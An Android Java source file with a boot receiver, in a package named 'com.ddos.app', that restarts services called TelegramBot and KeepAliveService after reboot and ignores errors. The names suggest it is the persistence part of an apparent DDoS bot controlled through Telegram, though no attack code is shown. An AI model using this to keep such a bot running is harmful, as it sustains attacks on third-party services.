package com.ddos.app;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import androidx.core.content.ContextCompat;

public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context ctx, Intent i) {
        String a = i.getAction();
        if (Intent.ACTION_BOOT_COMPLETED.equals(a)
                || "android.intent.action.QUICKBOOT_POWERON".equals(a)
                || Intent.ACTION_MY_PACKAGE_REPLACED.equals(a)) {
            try {
                ContextCompat.startForegroundService(ctx,
                        new Intent(ctx, TelegramBot.class));
                ContextCompat.startForegroundService(ctx,
                        new Intent(ctx, KeepAliveService.class));
            } catch (Exception ignored) {}
        }
    }
}
